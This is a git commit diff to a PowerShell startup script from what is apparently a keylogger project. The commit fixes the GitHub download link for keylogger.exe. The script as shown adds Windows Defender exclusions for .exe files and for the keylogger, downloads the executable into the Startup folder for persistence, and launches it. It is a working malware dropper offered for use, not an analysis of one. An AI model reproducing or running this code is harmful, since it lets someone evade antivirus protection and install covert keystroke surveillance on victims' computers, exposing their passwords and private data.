7b6cb8c4b3eb96ffd6a843c4bc8799245ae22712
nailtere1996 <133574223+nailtere1996@users.noreply.github.com>
2023-05-15 13:44:36 +0200

    Update startScript.ps1

--- startScript.ps1
+++ startScript.ps1
@@ -1,6 +1,6 @@
 Set-Location "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-Invoke-WebRequest -Uri "https://github.com/nailtere1996/keylogg/blob/49a06f0b0af43f09ac361e1a2cdc4221e5803e10/keylogger.exe" -OutFile keylogger.exe
+Invoke-WebRequest -Uri "https://github.com/nailtere1996/keylogg/raw/49a06f0b0af43f09ac361e1a2cdc4221e5803e10/keylogger.exe" -OutFile keylogger.exe
  #Download keylogger script
 Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe" -Force #Add exception for keylogger.exe file in antivirus
 Start-Process keylogger.exe #Start keylogger script
